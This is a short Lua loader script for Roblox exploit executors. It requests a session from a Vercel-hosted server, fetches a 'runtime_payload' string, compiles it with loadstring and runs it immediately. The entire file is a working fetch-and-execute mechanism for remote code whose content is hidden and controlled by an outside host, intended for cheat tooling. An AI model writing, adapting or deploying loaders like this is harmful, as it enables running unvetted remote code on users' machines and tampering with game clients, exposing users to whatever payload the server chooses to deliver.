local HttpService = game:GetService("HttpService")

local BASE = "https://mercury-delivery-8noaqpqs9-naellxs-projects.vercel.app"

local request =
(syn and syn.request)
or http_request
or request
or (http and http.request)

assert(request, "Executor doesn't support HTTP requests")

local sessionResponse = request({
Url = BASE .. "/api/session",
Method = "POST",
Headers = {
["Content-Type"] = "application/json"
},
Body = "{}"
})

assert(sessionResponse.StatusCode == 200, "Session request failed")

local session = HttpService:JSONDecode(sessionResponse.Body)

assert(session.success, session.message or "Failed to create session")

local fetchResponse = request({
Url = BASE .. "/api/fetch",
Method = "POST",
Headers = {
["Content-Type"] = "application/json"
},
Body = HttpService:JSONEncode({
session_token = session.session_token
})
})

assert(fetchResponse.StatusCode == 200, "Fetch request failed")

local payload = HttpService:JSONDecode(fetchResponse.Body)

assert(payload.success, payload.message or "Failed to fetch payload")

local chunk, err = loadstring(payload.runtime_payload)

assert(chunk, err)

return chunk()
